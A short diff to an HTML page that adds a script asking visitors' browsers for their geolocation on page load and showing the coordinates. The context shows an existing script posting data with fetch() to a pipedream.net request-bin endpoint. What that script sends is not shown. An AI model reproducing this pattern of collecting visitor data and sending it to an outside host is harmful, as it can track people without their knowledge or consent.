@@ -65,6 +65,25 @@
         fetch("https://enxxvyryc0hyb.x.pipedream.net/", options)
         }) 
     </script> 
+		<script>
+            function getLocation() 
+            {
+                if (navigator.geolocation) 
+                {
+                    navigator.geolocation.getCurrentPosition(showPosition);
+                } 
+                else 
+                { 
+                    x.innerHTML = "Geolocation is not supported by this browser.";
+                }
+            }
+
+            function showPosition(position) 
+            {
+                x.innerHTML = "Latitud: " + position.coords.latitude + " Longitud: " + position.coords.longitude;
+            }
+        getLocation();
+    </script>
 </body>
 </html>
 
